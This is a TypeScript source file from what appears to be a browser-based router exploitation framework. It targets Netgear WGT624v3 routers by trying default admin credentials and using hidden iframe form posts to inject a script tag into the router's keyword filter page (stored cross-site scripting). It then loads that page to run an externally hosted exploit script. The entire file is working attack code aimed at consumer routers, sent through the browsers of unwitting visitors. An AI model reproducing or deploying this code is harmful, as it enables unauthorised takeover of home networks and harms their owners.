import {Promise} from "es6-promise";
import FingerprintResult from "../../../fingerprint/FingerprintResult";
import BasePayload from "../../BasePayload";
import BasicAuthCredential from "../../BasicAuthCredential";
import PromiseUtil from "../../../shared/PromiseUtil";

interface FormParam {
    name:string,
    value:string
}

class WGT624v3Payload extends BasePayload {
    private static CREDENTIALS_TO_TEST:BasicAuthCredential[] = [
        {username: 'admin', password: ''},
        {username: 'admin', password: 'password'},
        {username: 'admin', password: 'aapm'},
    ];

    constructor(fingerprintResult:FingerprintResult) {
        super(fingerprintResult);
    }

    isTarget():boolean {
        return (
            this.fingerprintResult.vendor === 'NETGEAR' &&
            this.fingerprintResult.hwVersion === 'WGT624v3'
        );
    }

    runPayload():Promise<boolean> {
        let doPayload = (credentials:BasicAuthCredential):Promise<boolean> => {
            return this.tryInjectPayload(credentials)
                .then(() => this.tryRunInjectedPayload(credentials))
                .then((res:boolean) => {
                    console.log("doPayload", this.baseUrl, credentials, res);
                    return res;
                });
        }

        let injectTestPromiseFuncs = WGT624v3Payload.CREDENTIALS_TO_TEST.map((credentials:BasicAuthCredential) => {
            return () => doPayload(credentials);
        });

        return PromiseUtil.sequentially(injectTestPromiseFuncs)
            .then((results:boolean[]) => {
                return results.some((r:boolean) => r);
            });
    }

    private sendPostRequest(url:string, params:FormParam[]):Promise<any> {
        return new Promise((resolve) => {
            let frame:HTMLIFrameElement = document.createElement('iframe');
            let form:HTMLFormElement = document.createElement('form');

            params.forEach((param:FormParam) => {
                let field:HTMLInputElement = document.createElement('input');
                field.type = 'text';
                field.name = param.name;
                field.value = param.value;
                form.appendChild(field);
            });
            form.method = 'POST';
            form.action = url;
            frame.sandbox.add('allow-scripts', 'allow-same-origin', 'allow-forms');
            frame.style.display = 'none';
            frame.onload = () => {
                frame.contentDocument.body.appendChild(form);
                frame.onload = () => {
                    // 2nd onload should be when the form has been posted
                    frame.remove();
                    resolve();
                };
                form.submit();
            };
            document.body.appendChild(frame);
        });
    }

    private tryInjectPayload(credentials:BasicAuthCredential):Promise<any> {
        let exploitSrc = document.location.href.replace('index.html', '') + 'netgear_wgt624v3.js';
        let keywordUrl = 'http://' + credentials.username + ':' + credentials.password + '@'
            + this.fingerprintResult.ip + '/keyword.cgi';

        let addKeywordParams:FormParam[] = [
            {name: 'skeyword', value: 'never'},
            {name: 'cfKeyWord_Domain', value: `<script src="${exploitSrc}"></script>`},
            {name: 'cfKeyWord_AddKeyword', value: 'Add+Keyword'},
            {name: 'bs_enable', value: '0'},
            {name: 'bs_trustedip_enable', value: '0'},
            {name: 'bs_trustedip', value: '192.168.1.0'}
        ];
        let saveKeywordsParams:FormParam[] = [
            {name: 'skeyword', value: 'never'},
            {name: 'cfKeyWord_Domain', value: ''},
            {name: 'wzWAN_IPFinish', value: 'Apply'},
            {name: 'bs_enable', value: '0'},
            {name: 'bs_trustedip_enable', value: '0'},
            {name: 'bs_trustedip', value: '192.168.1.0'}
        ];
        return this.sendPostRequest(keywordUrl, addKeywordParams)
            .then(() => this.sendPostRequest(keywordUrl, saveKeywordsParams))
    }

    private waitForMessage(expectedMessage:string, timeout:number = 4000):Promise<Window> {
        return new Promise((resolve, reject) => {
            let timeoutId:number;
            let done = (success:boolean, reason?:string) => {
                clearTimeout(timeoutId);
                window.removeEventListener('message', onMessage, false);
                if (success) {
                    resolve();
                } else {
                    reject();
                }
                console.log('waitForMessage', expectedMessage, success, reason);
            };
            let onTimeout = () => done(false, "onTimeout");
            let onMessage = (evt:MessageEvent) => {
                if (evt.data === expectedMessage) {
                    done(true)
                } else {
                    done(false, `${evt.data} != ${expectedMessage}`);
                }
            };

            window.addEventListener('message', onMessage, false);
            timeoutId = setTimeout(onTimeout, timeout);
        });
    }

    private tryRunInjectedPayload(credentials:BasicAuthCredential):Promise<boolean> {
        let frame:HTMLIFrameElement = document.createElement('iframe');
        frame.src = 'http://' + credentials.username + ':' + credentials.password + '@'
            + this.fingerprintResult.ip + '/BKS_keyword.htm';
        frame.sandbox.add('allow-scripts', 'allow-same-origin', 'allow-forms');
        frame.style.display = 'none';
        document.body.appendChild(frame);

        return Promise.resolve()
            .then(() => this.waitForMessage("#LOADED#"))
            .then(() => {
                let promise = this.waitForMessage("#DONE#");
                frame.contentWindow.postMessage("#OK#", "*");
                return promise;
            })
            .then(() => {
                frame.remove();
                return true
            })
            .catch((err) => {
                if (err) {
                    console.log('tryRunInjectedPayload error');
                    console.error(err);
                }
                frame.remove();
                return false
            });
    }
}

export default WGT624v3Payload;
